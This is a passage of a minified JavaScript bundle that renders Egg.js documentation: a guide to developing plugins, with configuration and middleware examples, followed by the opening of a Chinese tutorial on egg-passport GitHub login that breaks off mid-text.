relationships among middlewares, plugins and applications?"),r.a.createElement("li",null,"How can I use the plugin?"),r.a.createElement("li",null,"How do I build a plugin?"),r.a.createElement("li",null,"...")),r.a.createElement("p",null,"As we've already explained some these points in chapter ",r.a.createElement(l["Link"],{to:"../basics/plugin"},"using plugins")," before. Now we are going through how to build a plugin."),r.a.createElement("h2",{id:"plugin-development"},r.a.createElement(l["AnchorLink"],{to:"#plugin-development","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin Development"),r.a.createElement("h3",{id:"quick-start-with-scaffold"},r.a.createElement(l["AnchorLink"],{to:"#quick-start-with-scaffold","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Quick Start with Scaffold"),r.a.createElement("p",null,"Just use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-boilerplate-plugin"},"egg-boilerplate-plugin")," to generates a scaffold for you."),r.a.createElement(o["a"],{code:"$ mkdir egg-hello && cd egg-hello\n$ npm init egg --type=plugin\n$ npm i\n$ npm test",lang:"bash"}),r.a.createElement("h2",{id:"directory-of-plugin"},r.a.createElement(l["AnchorLink"],{to:"#directory-of-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Directory of Plugin"),r.a.createElement("p",null,"Plugin is actually a ",r.a.createElement("code",null,"mini application"),", directory of plugin is as below:"),r.a.createElement(o["a"],{code:". egg-hello\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 app.js (optional)\n\u251c\u2500\u2500 agent.js (optional)\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 extend (optional)\n\u2502   |   \u251c\u2500\u2500 helper.js (optional)\n\u2502   |   \u251c\u2500\u2500 request.js (optional)\n\u2502   |   \u251c\u2500\u2500 response.js (optional)\n\u2502   |   \u251c\u2500\u2500 context.js (optional)\n\u2502   |   \u251c\u2500\u2500 application.js (optional)\n\u2502   |   \u2514\u2500\u2500 agent.js (optional)\n\u2502   \u251c\u2500\u2500 service (optional)\n\u2502   \u2514\u2500\u2500 middleware (optional)\n\u2502       \u2514\u2500\u2500 mw.js\n\u251c\u2500\u2500 config\n|   \u251c\u2500\u2500 config.default.js\n\u2502   \u251c\u2500\u2500 config.prod.js\n|   \u251c\u2500\u2500 config.test.js (optional)\n|   \u251c\u2500\u2500 config.local.js (optional)\n|   \u2514\u2500\u2500 config.unittest.js (optional)\n\u2514\u2500\u2500 test\n    \u2514\u2500\u2500 middleware\n        \u2514\u2500\u2500 mw.test.js",lang:"js"}),r.a.createElement("p",null,"It is almost the same as the application directory, what're the differences?"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"Plugin have no independant router or controller. This is because:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Usually routers are strongly bound to application, it is not fit here."),r.a.createElement("li",null,"An application might have plenty of dependant plugins, routers of plugin are very possible conflict with others. It would be a disaster."),r.a.createElement("li",null,"If you really need a general router, you should implement it as middleware of the plugin."))),r.a.createElement("li",null,r.a.createElement("p",null,"The specific information of plugin should be declared in the ",r.a.createElement("code",null,"package.json")," of ",r.a.createElement("code",null,"eggPlugin"),"\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"{","String","}"," name")," - plugin name(required), it must be unique, it will be used in the config of the dependencies of plugins.")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"{","Array","}"," dependencies")," - strong dependent plugins list of the current plugin(if one of these plugins here is not found, application's startup will fail).")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"{","Array","}"," optionalDependencies")," - optional dependencies list of this plugin.(if these plugins are not activated, only warnings would be occurred, and will not affect the startup of the application).")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"{","Array","}"," env")," - this option is available only when specifying the environment. For the list of env, please refer to ",r.a.createElement(l["Link"],{to:"../basics/env"},"env"),". This is optional, most time you can leave it."),r.a.createElement(o["a"],{code:'{\n  "name": "egg-rpc",\n  "eggPlugin": {\n    "name": "rpc",\n    "dependencies": ["registry"],\n    "optionalDependencies": ["vip"],\n    "env": ["local", "test", "unittest", "prod"]\n  }\n}',lang:"json"})))),r.a.createElement("li",null,r.a.createElement("p",null,"No ",r.a.createElement("code",null,"plugin.js"),"\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"eggPlugin.dependencies")," is for declaring dependencies only, not for importing, nor activating."),r.a.createElement("li",null,"If you want to manage multiple plugins, you should do it in",r.a.createElement(l["Link"],{to:"./framework"},"upper framework"))))),r.a.createElement("h2",{id:"dependencies-management-of-plugins"},r.a.createElement(l["AnchorLink"],{to:"#dependencies-management-of-plugins","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Dependencies Management of Plugins"),r.a.createElement("p",null,"The dependencies are managed by plugin himself, which is different from middlewares. Before loading plugins, application will read ",r.a.createElement("code",null,"eggPlugin > dependencies")," and ",r.a.createElement("code",null,"eggPlugin > optionalDependencies")," from ",r.a.createElement("code",null,"package.json"),", and then sort out the loading orders according to their relationships, for example, the loading order of the following plugins is ",r.a.createElement("code",null,"c => b => a"),":"),r.a.createElement(o["a"],{code:'// plugin a\n{\n  "name": "egg-plugin-a",\n  "eggPlugin": {\n    "name": "a",\n    "dependencies": [ "b" ]\n  }\n}\n\n// plugin b\n{\n  "name": "egg-plugin-b",\n  "eggPlugin": {\n    "name": "b",\n    "optionalDependencies": [ "c" ]\n  }\n}\n\n// plugin c\n{\n  "name": "egg-plugin-c",\n  "eggPlugin": {\n    "name": "c"\n  }\n}',lang:"json"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Attention: The values in ",r.a.createElement("code",null,"dependencies")," and ",r.a.createElement("code",null,"optionalDependencies")," are the ",r.a.createElement("code",null,"eggPlugin.name")," of plugins, not ",r.a.createElement("code",null,"package.name"),".")),r.a.createElement("p",null,"The ",r.a.createElement("code",null,"dependencies")," and ",r.a.createElement("code",null,"optionalDependencies")," are learnt from ",r.a.createElement("code",null,"npm"),", most time we use ",r.a.createElement("code",null,"dependencies"),", which is recommended. There are about two situations to apply the ",r.a.createElement("code",null,"optionalDependencies"),":"),r.a.createElement("ul",null,r.a.createElement("li",null,"Only be dependant in specific environment: for example, an authentication plugin, only depends on the mock plugin in development environment."),r.a.createElement("li",null,"Weakly depending, for example: A depends on B, but without B, A can take other choices.")),r.a.createElement("p",null,"Attention: if you are using ",r.a.createElement("code",null,"optionalDependencies"),", framework won't verify the activation of these dependencies, they are only for sorting loading orders. In such situation, the plugin will go through other ways such as ",r.a.createElement("code",null,"interface detection")," to decide processing logic."),r.a.createElement("h2",{id:"what-can-plugin-do"},r.a.createElement(l["AnchorLink"],{to:"#what-can-plugin-do","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"What can Plugin Do?"),r.a.createElement("p",null,"We've discussed what plugin is. Now what can it do?"),r.a.createElement("h3",{id:"built-in-objects-api-extensions"},r.a.createElement(l["AnchorLink"],{to:"#built-in-objects-api-extensions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Built-in Objects API Extensions"),r.a.createElement("p",null,"Extend the built-in objects of the framework, just like the application"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/request.js")," - extends Koa#Request object"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/response.js")," - extends Koa#Response object"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/context.js")," - extends Koa#Context object"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/helper.js ")," - extends Helper object"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/application.js")," - extends Application object"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/agent.js")," - extends Agent object")),r.a.createElement("h3",{id:"insert-custom-middlewares"},r.a.createElement(l["AnchorLink"],{to:"#insert-custom-middlewares","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Insert Custom Middlewares"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"First, define and implement middleware under directory ",r.a.createElement("code",null,"app/middleware"),":"),r.a.createElement(o["a"],{code:"'use strict';\n\nconst staticCache = require('koa-static-cache');\nconst assert = require('assert');\nconst mkdirp = require('mkdirp');\n\nmodule.exports = (options, app) => {\n  assert.strictEqual(\n    typeof options.dir,\n    'string',\n    'Must set `app.config.static.dir` when static plugin enable',\n  );\n\n  // ensure directory exists\n  mkdirp.sync(options.dir);\n\n  app.loggers.coreLogger.info(\n    '[egg-static] starting static serve %s -> %s',\n    options.prefix,\n    options.dir,\n  );\n\n  return staticCache(options);\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"Insert middleware to the appropriate position in ",r.a.createElement("code",null,"app.js"),"(e.g. insert static middleware before bodyParser):"),r.a.createElement(o["a"],{code:"const assert = require('assert');\n\nmodule.exports = (app) => {\n  // insert static middleware before bodyParser\n  const index = app.config.coreMiddleware.indexOf('bodyParser');\n  assert(index >= 0, 'bodyParser highly needed');\n\n  app.config.coreMiddleware.splice(index, 0, 'static');\n};",lang:"js"}))),r.a.createElement("h3",{id:"initialization-on-application-starting"},r.a.createElement(l["AnchorLink"],{to:"#initialization-on-application-starting","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Initialization on Application Starting"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"If you want to read some local config before startup:"),r.a.createElement(o["a"],{code:"// ${plugin_root}/app.js\nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports = (app) => {\n  app.customData = fs.readFileSync(path.join(app.config.baseDir, 'data.bin'));\n\n  app.coreLogger.info('read data ok');\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"If you want to do some async starting business, you can do it with ",r.a.createElement("code",null,"app.beforeStart")," API:"),r.a.createElement(o["a"],{code:"// ${plugin_root}/app.js\nconst MyClient = require('my-client');\n\nmodule.exports = (app) => {\n  app.myClient = new MyClient();\n  app.myClient.on('error', (err) => {\n    app.coreLogger.error(err);\n  });\n  app.beforeStart(async () => {\n    await app.myClient.ready();\n    app.coreLogger.info('my client is ready');\n  });\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"You can add initialization business of agent with ",r.a.createElement("code",null,"agent.beforeStart")," API:"),r.a.createElement(o["a"],{code:"// ${plugin_root}/agent.js\nconst MyClient = require('my-client');\n\nmodule.exports = (agent) => {\n  agent.myClient = new MyClient();\n  agent.myClient.on('error', (err) => {\n    agent.coreLogger.error(err);\n  });\n  agent.beforeStart(async () => {\n    await agent.myClient.ready();\n    agent.coreLogger.info('my client is ready');\n  });\n};",lang:"js"}))),r.a.createElement("h3",{id:"setup-schedule-task"},r.a.createElement(l["AnchorLink"],{to:"#setup-schedule-task","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Setup Schedule Task"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"Setup dependencies of schedule plugin in ",r.a.createElement("code",null,"package.json"),":"),r.a.createElement(o["a"],{code:'{\n  "name": "your-plugin",\n  "eggPlugin": {\n    "name": "your-plugin",\n    "dependencies": ["schedule"]\n  }\n}',lang:"json"})),r.a.createElement("li",null,r.a.createElement("p",null,"Create a new file in ",r.a.createElement("code",null,"$","{","plugin_root","}","/app/schedule/")," directory to edit your schedule task:"),r.a.createElement(o["a"],{code:"exports.schedule = {\n  type: 'worker',\n  cron: '0 0 3 * * *',\n  // interval: '1h',\n  // immediate: true,\n};\n\nexports.task = async (ctx) => {\n  // your logic code\n};",lang:"js"}))),r.a.createElement("h3",{id:"best-practice-of-global-instance-plugins"},r.a.createElement(l["AnchorLink"],{to:"#best-practice-of-global-instance-plugins","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Best Practice of Global Instance Plugins"),r.a.createElement("p",null,"Some plugins are made to introduce existing service into framework, like ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql"),", ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-oss"},"egg-oss"),".They all need to create corresponding instances in applications. We notice that there are some common problems when developing plugins of this kind:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Use different instances of the same service in one application (e.g: connect to two different MySQL databases)."),r.a.createElement("li",null,"Dynamically initialize connection after getting config from other service (e.g: get the MySQL server address from configuration center and then create connection).")),r.a.createElement("p",null,"If each plugin makes their own implementation, all sorts of configs and initializations will be chaotic. So the framework supplies the ",r.a.createElement("code",null,"app.addSingleton(name, creator)")," API to unify the creation of this kind of services. Note that while using the ",r.a.createElement("code",null,"app.addSingleton(name, creator)")," method, the configuration file must have the ",r.a.createElement("code",null,"client")," or ",r.a.createElement("code",null,"clients")," key configuration as the ",r.a.createElement("code",null,"config")," to the ",r.a.createElement("code",null,"creator")," function."),r.a.createElement("h4",{id:"ways-of-writing-plugins"},r.a.createElement(l["AnchorLink"],{to:"#ways-of-writing-plugins","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Ways of writing plugins"),r.a.createElement("p",null,"We simplify the ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql")," plugin to see how to write it:"),r.a.createElement(o["a"],{code:"// egg-mysql/app.js\nmodule.exports = (app) => {\n  // The first parameter mysql defines the field  mounted to app, we can access MySQL singleton instance via `app.mysql`\n  // The second parameter createMysql accepts two parameters (config, app), and then returns a MySQL instance\n  app.addSingleton('mysql', createMysql);\n};\n\n/**\n * @param  {Object} config   The config is processed by the framework. If the application is configured with multiple MySQL instances, each config would be passed in and call multiple createMysql\n * @param  {Application} app  the current application\n * @return {Object}          return the created MySQL instance\n */\nfunction createMysql(config, app) {\n  assert(config.host && config.port && config.user && config.database);\n  // create instance\n  const client = new Mysql(config);\n\n  // check before start the application\n  app.beforeStart(async () => {\n    const rows = await client.query('select now() as currentTime;');\n    app.coreLogger.info(\n      `[egg-mysql] init instance success, rds currentTime: ${rows[0].currentTime}`,\n    );\n  });\n\n  return client;\n}",lang:"js"}),r.a.createElement("p",null,"The initialization function also supports ",r.a.createElement("code",null,"Async function"),", convenient for some special plugins that need to be asynchronous to get some configuration files."),r.a.createElement(o["a"],{code:"async function createMysql(config, app) {\n  // get mysql configurations asynchronous\n  const mysqlConfig = await app.configManager.getMysqlConfig(config.mysql);\n  assert(\n    mysqlConfig.host &&\n      mysqlConfig.port &&\n      mysqlConfig.user &&\n      mysqlConfig.database,\n  );\n  // create instance\n  const client = new Mysql(mysqlConfig);\n\n  // check before start the application\n  const rows = await client.query('select now() as currentTime;');\n  app.coreLogger.info(\n    `[egg-mysql] init instance success, rds currentTime: ${rows[0].currentTime}`,\n  );\n\n  return client;\n}",lang:"js"}),r.a.createElement("p",null,"As you can see, all we need to do for this plugin is passing the fields that need to be mounted and the corresponding initialization function. Framework will be in charge of managing all the configs and the ways to access the instances."),r.a.createElement("h4",{id:"application-layer-usage-case"},r.a.createElement(l["AnchorLink"],{to:"#application-layer-usage-case","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Application Layer Usage Case"),r.a.createElement("h5",{id:"single-instance"},r.a.createElement(l["AnchorLink"],{to:"#single-instance","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Single Instance"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"Declare MySQL config in config file:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  mysql: {\n    client: {\n      host: 'mysql.com',\n      port: '3306',\n      user: 'test_user',\n      password: 'test_password',\n      database: 'test',\n    },\n  },\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"Access database through ",r.a.createElement("code",null,"app.mysql")," directly:"),r.a.createElement(o["a"],{code:"// app/controller/post.js\nclass PostController extends Controller {\n  async list() {\n    const posts = await this.app.mysql.query(sql, values);\n  },\n}",lang:"js"}))),r.a.createElement("h5",{id:"multiple-instances"},r.a.createElement(l["AnchorLink"],{to:"#multiple-instances","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Multiple Instances"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"We need to configure MySQL in the config file, but different from single instance, we need to add ",r.a.createElement("code",null,"clients")," in the config to declare the configuration of different instances. Meanwhile, the ",r.a.createElement("code",null,"default")," field can be used to configure the shared configuration in multiple instances (e.g: ",r.a.createElement("code",null,"host")," and ",r.a.createElement("code",null,"port"),"). In this case, we should use ",r.a.createElement("code",null,"get")," function to specify the corresponding instance(e.g: use ",r.a.createElement("code",null,"app.mysql.get('db1').query()")," instead of using ",r.a.createElement("code",null,"app.mysql.query()")," directly to get an ",r.a.createElement("code",null,"undefined"),")."),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.mysql = {\n  clients: {\n    // clientId, access the client instance by app.mysql.get('clientId')\n    db1: {\n      user: 'user1',\n      password: 'upassword1',\n      database: 'db1',\n    },\n    db2: {\n      user: 'user2',\n      password: 'upassword2',\n      database: 'db2',\n    },\n  },\n  // default configuration for all databases\n  default: {\n    host: 'mysql.com',\n    port: '3306',\n  },\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"Access the corresponding instance by ",r.a.createElement("code",null,"app.mysql.get('db1')"),":"),r.a.createElement(o["a"],{code:"// app/controller/post.js\nclass PostController extends Controller {\n  async list() {\n    const posts = await this.app.mysql.get('db1').query(sql, values);\n  },\n}",lang:"js"}))),r.a.createElement("h5",{id:"dynamically-instantiating"},r.a.createElement(l["AnchorLink"],{to:"#dynamically-instantiating","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Dynamically Instantiating"),r.a.createElement("p",null,"Instead of declaring the configuration in the configuration file in advance, we can dynamically initialize an instance at the runtime of the application."),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.beforeStart(async () => {\n    //  get MySQL config from configuration center { host, post, password, ... }\n    const mysqlConfig = await app.configCenter.fetch('mysql');\n    // create MySQL instance dynamically\n    app.database = app.mysql.createInstanceAsync(mysqlConfig);\n  });\n};",lang:"js"}),r.a.createElement("p",null,"Access the instance through ",r.a.createElement("code",null,"app.database")),r.a.createElement(o["a"],{code:"// app/controller/post.js\nclass PostController extends Controller {\n  async list() {\n    const posts = await this.app.database.query(sql, values);\n  },\n}",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Attention: when creating the instance dynamically, framework would read the ",r.a.createElement("code",null,"default")," configuration from the config file as the default.")),r.a.createElement("h3",{id:"plugin-locate-rule"},r.a.createElement(l["AnchorLink"],{to:"#plugin-locate-rule","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin Locate Rule"),r.a.createElement("p",null,"When loading the plugins in the framework, it will follow the rules below:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"If there is the path configuration, load them in path directly.")),r.a.createElement("li",null,r.a.createElement("p",null,"If there is no path configuration, search them with the package name, the search orders are:"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("code",null,"node_modules")," directory of the application root"),r.a.createElement("li",null,r.a.createElement("code",null,"node_modules")," directory of the dependencies"),r.a.createElement("li",null,r.a.createElement("code",null,"node_modules")," of current directory(generally for unit test compatibility)")))),r.a.createElement("h3",{id:"plugin-specification"},r.a.createElement(l["AnchorLink"],{to:"#plugin-specification","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin Specification"),r.a.createElement("p",null,"It's well welcomed to your contributions to the new plugins, but also hope you follow some of following specifications:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"Naming Rules:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"npm")," packages must append prefix ",r.a.createElement("code",null,"egg-"),",and all letters must be lowercase, e.g: ",r.a.createElement("code",null,"egg-xxx"),". The long names should be concatenated with middle-lines: ",r.a.createElement("code",null,"egg-foo-bar"),"."),r.a.createElement("li",null,"The corresponding plugin should be named in camel-case. The name should be translated according to the middle-lines of the ",r.a.createElement("code",null,"npm")," name:",r.a.createElement("code",null,"egg-foo-bar")," => ",r.a.createElement("code",null,"fooBar"),"."),r.a.createElement("li",null,"The use of middle-lines is not compulsive, e.g: userservice(egg-userservice) and user-service(egg-user-service) are both acceptable."))),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"package.json")," Rules:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"Add ",r.a.createElement("code",null,"eggPlugin")," property according to the details discussed before.")),r.a.createElement("li",null,r.a.createElement("p",null,"For convenient index, add ",r.a.createElement("code",null,"egg"),",",r.a.createElement("code",null,"egg-plugin"),",",r.a.createElement("code",null,"eggPlugin")," in ",r.a.createElement("code",null,"keywords"),":"),r.a.createElement(o["a"],{code:'{\n  "name": "egg-view-nunjucks",\n  "version": "1.0.0",\n  "description": "view plugin for egg",\n  "eggPlugin": {\n    "name": "nunjucks",\n    "dep": ["security"]\n  },\n  "keywords": [\n    "egg",\n    "egg-plugin",\n    "eggPlugin",\n    "egg-plugin-view",\n    "egg-view",\n    "nunjucks"\n  ]\n}',lang:"json"}))))),r.a.createElement("h2",{id:"why-do-not-use-the-npm-package-name-as-the-plugin-name"},r.a.createElement(l["AnchorLink"],{to:"#why-do-not-use-the-npm-package-name-as-the-plugin-name","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Why Do Not Use the ",r.a.createElement("code",null,"npm")," Package Name as the Plugin Name?"),r.a.createElement("p",null,"Egg defines the plugin name through the ",r.a.createElement("code",null,"eggPlugin.name"),", it is only unique in application or framework, that means ",r.a.createElement("strong",null,"many npm packages might get the same plugin name"),", why design in this way?"),r.a.createElement("p",null,"First, Egg plugin does not only support npm packages, but also supports plugins-searching in local directory. In Chapter ",r.a.createElement(l["Link"],{to:"../intro/progressive"},"progressive")," we've mentioned how to make progress by using these two configurations. Directories are more friendly to unit tests. So, Egg can not ensure uniqueness through npm package names."),r.a.createElement("p",null,"What's more, Egg can use this feature to make an adapter, for example, the plugin defined in",r.a.createElement(l["AnchorLink"],{to:"./view-plugin#PluginNameSpecification"},"Template Develop Spec")," was named as view, but there are plugins named ",r.a.createElement("code",null,"egg-view-nunjucks")," and ",r.a.createElement("code",null,"egg-view-react"),", the users only need to change the plugin and modify the templates, no need to modify the controllers, because all these plugins have implemented the same APIs."),r.a.createElement("p",null,r.a.createElement("strong",null,"Giving the same plugin name and the same API to the same plugin can make quick switch between them"),". This is really really useful in template and database.")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},vFOa:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,r.a.createElement("strong",null,"\u300e\u767b\u5f55\u9274\u6743\u300f")," \u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u4e1a\u52a1\u573a\u666f\uff0c\u5305\u62ec\u300e\u8d26\u53f7\u5bc6\u7801\u767b\u5f55\u65b9\u5f0f\u300f\u548c\u300e\u7b2c\u4e09\u65b9\u7edf\u4e00\u767b\u5f55\u300f\u3002"),r.a.createElement("p",null,"\u5176\u4e2d\uff0c\u540e\u8005\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528\u5230\uff0c\u5982 Google\uff0c GitHub\uff0cQQ \u7edf\u4e00\u767b\u5f55\uff0c\u5b83\u4eec\u90fd\u662f\u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"https://oauth.net/2/"},"OAuth")," \u89c4\u8303\u3002"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://www.passportjs.org/"},"Passport")," \u662f\u4e00\u4e2a\u6269\u5c55\u6027\u5f88\u5f3a\u7684\u8ba4\u8bc1\u4e2d\u95f4\u4ef6\uff0c\u652f\u6301 ",r.a.createElement("code",null,"Github"),"\uff0c",r.a.createElement("code",null,"Twitter"),"\uff0c",r.a.createElement("code",null,"Facebook")," \u7b49\u77e5\u540d\u670d\u52a1\u5382\u5546\u7684 ",r.a.createElement("code",null,"Strategy"),"\uff0c\u540c\u65f6\u4e5f\u652f\u6301\u901a\u8fc7\u8d26\u53f7\u5bc6\u7801\u7684\u65b9\u5f0f\u8fdb\u884c\u767b\u5f55\u6388\u6743\u6821\u9a8c\u3002"),r.a.createElement("p",null,"Egg \u5728\u5b83\u4e4b\u4e0a\u63d0\u4f9b\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-passport"},"egg-passport")," \u63d2\u4ef6\uff0c\u628a\u521d\u59cb\u5316\u3001\u9274\u6743\u6210\u529f\u540e\u7684\u56de\u8c03\u5904\u7406\u7b49\u901a\u7528\u903b\u8f91\u5c01\u88c5\u6389\uff0c\u4f7f\u5f97\u5f00\u53d1\u8005\u4ec5\u9700\u8c03\u7528\u51e0\u4e2a API \u5373\u53ef\u65b9\u4fbf\u7684\u4f7f\u7528 Passport \u3002"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://www.passportjs.org/"},"Passport")," \u7684\u6267\u884c\u65f6\u5e8f\u5982\u4e0b\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u7528\u6237\u8bbf\u95ee\u9875\u9762"),r.a.createElement("li",null,"\u68c0\u67e5 Session"),r.a.createElement("li",null,"\u62e6\u622a\u8df3\u9274\u6743\u767b\u5f55\u9875\u9762"),r.a.createElement("li",null,"Strategy \u9274\u6743"),r.a.createElement("li",null,"\u6821\u9a8c\u548c\u5b58\u50a8\u7528\u6237\u4fe1\u606f"),r.a.createElement("li",null,"\u5e8f\u5217\u5316\u7528\u6237\u4fe1\u606f\u5230 Session"),r.a.createElement("li",null,"\u8df3\u8f6c\u5230\u6307\u5b9a\u9875\u9762")),r.a.createElement("h2",{id:"\u4f7f\u7528-egg-passport"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-egg-passport","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 egg-passport"),r.a.createElement("p",null,"\u4e0b\u9762\uff0c\u6211\u4eec\u5c06\u4ee5 GitHub \u767b\u5f55\u4e3a\u4f8b\uff0c\u6765\u6f14\u793a\u4e0b\u5982\u4f55\u4f7f\u7528\u3002"),r.a.createElement("h3",{id:"\u5b89\u88c5"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u88c5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u88c5"),r.a.createElement(o["a"],{code:"$ npm i --save egg-passport\n$ npm i --save egg-passport-github",lang:"bash"}),r.a.createElement("p",null,"\u66f4\u591a\u63d2\u4ef6\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/topics/egg-passport"},"GitHub Topic - egg-passport")," \u3002"),r.a.createElement("h3",{id:"\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5f00\u542f\u63d2\u4ef6\uff1a")),r.a.createElement(o["a"],{code:"// config/plugin.js\nmodule.exports.passport = {\n  enable: true,\n  package: 'egg-passport',\n};\n\nmodule.exports.passportGithub = {\n  enable: true,\n  package: 'egg-passport-github',\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u914d\u7f6e:")),r.a.createElement("p",null,"\u6ce8\u610f\uff1a",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-passport"},"egg-passport")," \u6807\u51c6\u5316\u4e86\u914d\u7f6e\u5b57\u6bb5\uff0c\u7edf\u4e00\u4e3a ",r.a.createElement("code",null,"key")," \u548c ",r.a.createElement("code",null,"secret")," \u3002"),r.a.createElement(o["a"],{code:"// config/default.js\nconfig.passportGithub = {\n  key: 'your_clientID',\n  secret: 'your_clientSecret',\n  // callbackURL: '/passport/github/callback',\n  // proxy: false,\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a")),r.a.createElement("ul",null,r.a.createElement("li",null,"\u521b\u5efa\u4e00\u4e2a ",r.a.createElement(l["Link"],{to:"https://github.com/settings/applications/new"},"GitHub OAuth Apps"),"\uff0c\u5f97\u5230 ",r.a.createElement("code",null,"clientID")," \u548c ",r.a.createElement("code",null,"clientSecret")," \u4fe1\u606f\u3002"),r.a.createElement("li",null,"\u586b\u5199 ",r.a.createElement("code",null,"callbackURL"),"\uff0c\u5982 ",r.a.createElement("code",null,"http://127.0.0.1:7001/passport/github/callback"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u7ebf\u4e0a\u90e8\u7f72\u65f6\u9700\u8981\u66f4\u65b0\u4e3a\u5bf9\u5e94\u7684\u57df\u540d"),r.a.createElement("li",null,"\u8def\u5f84\u4e3a\u914d\u7f6e\u7684 ",r.a.createElement("code",null,"options.callbackURL"),"\uff0c\u9ed8\u8ba4\u4e3a 